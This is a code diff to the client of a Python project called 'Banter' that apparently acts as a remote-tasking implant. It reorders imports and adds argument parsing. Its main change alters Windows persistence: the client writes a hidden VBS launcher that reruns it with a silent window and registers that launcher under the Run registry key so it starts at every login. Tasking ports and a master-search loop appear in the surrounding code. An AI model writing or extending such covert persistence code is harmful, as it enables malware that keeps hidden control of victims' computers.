@@ -1,18 +1,19 @@
 """Client component of the Banter project."""
-import socket
-import sys
-import netifaces
-import ipaddress
-import subprocess
-import logging
-import time
+import argparse
 import io
+import ipaddress
+import logging
 import os
+import socket
+import subprocess
+import sys
+import time
 
+import netifaces
 import win32api
+import win32com.client
 import win32con
 import win32gui
-import win32com.client
 
 
 class Banter():
@@ -30,7 +31,7 @@ class Banter():
         else:
             logging.basicConfig(level=logging.CRITICAL)
         self.PERSISTENCE_KEY = """Software\\Microsoft\\Windows\\CurrentVersion\\Run"""
-        self.REG_KEY_ENTRY = "slash"
+        self.REG_KEY_ENTRY = "data"
         self.PORT = 34072
         self.TASKING_PORT = 34073
         self.BUFFER_SIZE = 8192
@@ -45,7 +46,7 @@ class Banter():
         self.LAST_HEARD_LIMIT = 60
         # How many times to attempt a connection before aborting
         self.CONNECTION_ATTEMPT_LIMIT = 5
-
+        # Whether or persistence should be added on this run
         self.PERSIST = persist
 
         self.name = self.get_name()
@@ -83,8 +84,15 @@ class Banter():
         if persist:
             if not os.path.exists(vbs_script_file):
                 curr_file = win32api.GetModuleFileName(0)
+                target_exe = os.path.basename(curr_file)
+                if target_exe == "python.exe":
+                    logging.debug("Running as python script, adding args to persistence script.")
+                    curr_file = win32api.GetCommandLine()
                 vbs_script = open(vbs_script_file, "w")
-                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} r", 0\nSet WShell = Nothing'.format(curr_file))   # nopep8
+                # Windows doesn't like it when something being executed using the autorun registry key being used here
+                # modifies the registry, so the '-r' argument is passed to this script to disable the persistence
+                # adding routine on bootup.
+                vbs_script.write('Dim WShell\nSet WShell = CreateObject("Wscript.Shell")\nWShell.Run "{0} -r", 0\nSet WShell = Nothing'.format(curr_file))   # nopep8
                 vbs_script.close()
                 startup_script = "wscript \"{0}\"".format(vbs_script_file)
                 curr_script = None
@@ -431,11 +439,17 @@ class Banter():
             time.sleep(self.MASTER_SEARCH_SLEEP)
 
 if __name__ == "__main__":
-    debug = False
-    persist = True
-    if "debug" in sys.argv:
-        debug = True
-    if "r" in sys.argv:
-        persist = False
-    client = Banter(debug, persist)
+    """Mainline.
+
+    Possible arguments include:
+    debug: enable debug logging
+    r: disabl
+    """
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-d', '--debug', default=False, help="Enable debug logging", action="store_true")
+    parser.add_argument('-r', default=True, help="Don't add persistence", action="store_false")
+
+    args = parser.parse_args()
+
+    client = Banter(args.debug, args.r)
     client.start()
